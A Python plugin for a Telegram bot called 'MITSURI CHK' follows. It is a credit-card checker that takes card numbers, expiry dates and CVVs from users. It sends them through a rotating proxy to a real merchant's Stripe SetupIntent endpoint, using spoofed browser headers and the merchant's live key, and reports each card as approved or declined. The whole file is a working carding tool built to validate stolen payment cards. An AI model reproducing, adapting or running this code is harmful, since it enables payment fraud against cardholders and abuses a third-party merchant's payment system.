import time
import re
from random import randint
import requests
import time
from random import *
from pyrogram import Client
from pyrogram import filters
import random
import time
from Plugins.Func import connect_to_db
import string
from faker import Faker
from func_bin import get_bin_info
import random
from datetime import datetime, timedelta
from Plugins.SegundoPlano.antispam import *


def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''
def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str



@Client.on_message(filters.command("mi", prefixes=['.','/','!','?'], case_sensitive=False) & filters.text)
def Shopify(client, message):
    
    try:
        
        conn = connect_to_db()
        cursor = conn.cursor()

        chat_id = message.chat.id
        userid = message. from_user. id
        command = "/mi"
        spam_message = antispam(userid, command, message)
        if spam_message is not None:
            message.reply (spam_message)
            return
        
        cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (userid,))
        user_data = cursor.fetchone()
        if not user_data:
            return message.reply('Primero debes rgistrarte para usar este comando, usa /register')
        
        
        chat_grupo = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id,))
        chat_grupo = cursor.fetchone()
        
        if all(role not in user_data[0] for role in ['Premium', 'Free', 'Seller', 'Owner']) and all(role not in user_data[0] for role in ['Grupo']):
            return message.reply('No tienes permisos para utilizar este comando, contacta a mi administrador @GolDRoyerOP.')
        
        if user_data:
          rango = user_data[0]

        if message.from_user is not None:
            username = getattr(message.from_user, 'username', None)
        
        
        ccs = message.text[len('/mi '):]  
        
        x = get_bin_info(ccs[:6])
                        
        inicio = time.time()
        reply = message.reply_to_message
        
            
        if not ccs:
            if not reply or not reply.text:
                return message.reply(f"""       
<b>あ MITSURI CHK あ
ESTADO: <code>ON</code>
GATEWAY: <code>MIATA</code>
PASARELA: <code>STRIPE AUTH</code></b>""")
     

            ccs_match = re.search(r"\d{16}[\s|:|::]\d{2}[\s|:|::]\d{4}[\s|:|::]\d{3}", reply.text)
            if not ccs_match:
                return message.reply(f"Agregue una tarjeta Valida.</a> ")
            ccs = ccs_match.group(0)
        
        ccs = ccs.replace(" ", "")

        #----- Extraer la información de la tarjeta de crédito utilizando una expresión regular
        expl = re.split(r"[\s:|]+", ccs)
        if len(expl) < 4:
            # La cadena no tiene suficientes elementos para ser una tarjeta de crédito válida
            return message.reply(f"INGRESE UNA TARJETA VALIDA")

        expl = re.findall(r'\d+', ccs)
        cc = expl[0]
        mes = expl[1]
        ano = expl[2]
        cvv = expl[3]      
        ccvip = f"{cc}|{mes}|{ano}|{cvv}"        
        bin_number = cc[:6]       


        if not x: return message.reply(text=f"<b>Ingresa Una Tarjeta Valida.</b> ",quote=True)

        if not re.match(r'^\d{15,16}$', cc):
            return message.reply(f"<b>CARD INVALIDA</b>")

        # Validar la fecha de expiración
        if not re.match(r'^\d{2}/\d{2}(\d{2})?$', f'{mes}/{ano}'):
            return message.reply(f"<b>FECHA INVALIDA</b>")

        # Validar el CVV
        if not re.match(r'^\d{3,4}$', cvv):
            return message.reply(f"<b>CVV INVALIDO")
              
        edite_message = message.reply(f"""
<b>あ MITSURI CHK あ</b>
<b>Gateway: <code>MIATA</code></b>
<b>Proceso: Verificando...</b>
<b>Tarjeta:</b> <code>{ccs}</code>
<b>Informacion:</b> {x.get("type")} {x.get("level")} {x.get("flag")}""")
        
        session = requests.Session()
        session.proxys = {"https": "http://exxfmtgy-rotate:luaolp066df0@p.webshare.io:80"}

        time.sleep(3)
            
            #----------Get UIDS for Requests Pay stripe-------------------------------#
            
        headers = {
                        'authority': 'm.stripe.com',
                        'accept': '*/*',
                        'accept-language': 'en-US,en;q=0.9',
                        'content-type': 'text/plain;charset=UTF-8',
                        # 'cookie': 'm=69e15136-78f4-43e1-b64c-32e095da9fbfe0ed83',
                        'origin': 'https://m.stripe.network',
                        'referer': 'https://m.stripe.network/',
                        'sec-ch-ua': '"Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
                        'sec-ch-ua-mobile': '?0',
                        'sec-ch-ua-platform': '"Windows"',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'cross-site',
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47',
            }
                    
        response1 = session.post('https://m.stripe.com/6', headers=headers, verify=False).json()
        muid = response1['muid']
        guid = response1['guid']
        sid = response1['sid']
            
        print("UIDS:",response1)
        time.sleep(3)
            
            #---------------Get Secret-Client--------------------#
        headers = {
                'Accept': 'application/json',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Connection': 'keep-alive',
                'Origin': 'https://dashboard.switcherstudio.com',
                'Referer': 'https://dashboard.switcherstudio.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

        response2 = session.get('https://api.switcherstudio.com/api/StripeIntents/SetupIntent', headers=headers).json()

        seti = response2['id']
        c_seti = response2['client_secret']
        print("Seti:",seti)
        print("Cseti:",c_seti)
        time.sleep(3)

            #-------------Responses-Payment---------------#
        headers = {
                'Accept': 'application/json',
                'Accept-Language': 'es-ES,es;q=0.9',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
                'Referer': 'https://js.stripe.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
            }

        data = f'return_url=https%3A%2F%2Fdashboard.switcherstudio.com%2Fgetting-started%3FplanId%3DSSMOBUSINESS99V2%26resellerInventoryItemId%3D97732334-8fea-440f-8be3-f25fc1dbfb6c%26isTrialing%3Dtrue&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[billing_details][address][postal_code]=10032&payment_method_data[billing_details][address][country]=US&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F08d3883199%3B+stripe-js-v3%2F08d3883199%3B+payment-element&payment_method_data[referrer]=https%3A%2F%2Fdashboard.switcherstudio.com&payment_method_data[time_on_page]=135929&payment_method_data[guid]={guid}&payment_method_data[muid]={muid}&payment_method_data[sid]={sid}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_4M6W94FIwtPtRw97OP9aadh8&client_secret={c_seti}'

        response3 = session.post(
                f'https://api.stripe.com/v1/setup_intents/{seti}/confirm',
                headers=headers,
                data=data,
            )
        resp = response3.text

        gateway = "APOLO $17.65"
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        
        print("RESULT:",resp)
        time.sleep(3)
        
        if "'status': 'succeeded'" in resp:
                msg = "APROVED ✅"
                respuesta = "Approved✅"
                
        elif 'succeeded' in resp:
                msg = "APROVED ✅"
                respuesta = "succeeded"
                
        elif "Your card's expiration month is invalid" in resp:
                    msg = "APROVED ✅"
                    respuesta = "Your card's expiration month is invalid, CCN"
                    
        elif 'incorrect_cvc' in response3:
                    msg = "APROVED ✅"
                    respuesta = "incorrect_cvc"
                    
        elif "Your cards has insufficient funds." in resp:
                    msg = "APROVED ✅"
                    respuesta = f"Your cards has insufficient funds."
                
        elif "Your card's security code is incorrect" in resp:
                    msg = "APROVED ✅"
                    respuesta = f"Your card's security code is incorrec"
                        
        elif "insufficient funds" in resp:
                msg = "APROVED ✅"
                respuesta = "insufficient funds "
                
        elif "Your card number is incorrect" in resp:
                msg = "DECLINED ❌"
                respuesta = "Your card number is incorrect"
                
        elif "incorrect_number" in resp:
                msg = "DECLINED ❌"
                respuesta = "incorrect_number"
                
        elif "incorrect_number" in resp:
                msg = "DECLINED ❌"
                respuesta = "incorrect_number"
            
        elif "requires_action" in resp:
                msg = "DECLINED ❌"
                respuesta = "confirmation_challenge_Fail"


                
        else:
                msg = "DECLINED ❌"
                respuesta = "Card no precessing or declined"
        
        return edite_message.edit_text(f""" 
<b>MITSURI CHK - STRIPE AUTH</b>
<b>[<code>あ</code>] CC:</b> <code>{ccvip}</code>
<b>[<code>あ</code>] Status:</b> <code>{msg}</code>
<b>[<code>あ</code>] Response:</b> <code>{respuesta}</code>
- - - - - - - - - - - - - - - - - - - - - - - -
<b>[<code>あ</code>] Banco:</b> <code>{x.get("bank_name")}</code>
<b>[<code>あ</code>] Data:</b> <code>{x.get("type")}</code> - <code>{x.get("level")}</code> - <code>{x.get("vendor")}</code>
<b>[<code>あ</code>] Pais:</b> <code>{x.get("country")} {x.get("flag")}</code>
- - - - - - - - - - - - - - - - - - - - - - - -
<b>[<code>あ</code>] Tiempo:</b> <code>{tiempo} segudos</code>
<b>[<code>あ</code>] Checado por:</b> @{username} [{rango}]
<b>[<code>あ</code>] Owner:</b>  @GolDRoyerOP""")

        
        
    except Exception as e:
        print(f"Error inesperado: {e}")
        admin = "-"
        input = "-"
 
        if message.reply_to_message: 
            ccvip = message.reply_to_message.text

        else: 
            ccvip = message.text[len('/pp '):]
        username = message.from_user.username
        #---------- PLANTILLA DE CARGA ------------#
        inicio = time.time()
        gateway = "APOLO $17.65"
        end = time.time()
        tiempo = str(inicio - end)[1:5]
        msg = "DECLINED ❌"    
        respuesta = f"Error (Try Aigan) / Si persiste contacta un admin" 
        